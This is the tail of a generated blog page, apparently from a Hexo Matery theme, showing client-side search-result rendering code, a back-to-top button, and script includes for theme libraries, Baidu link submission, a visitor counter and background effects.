                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
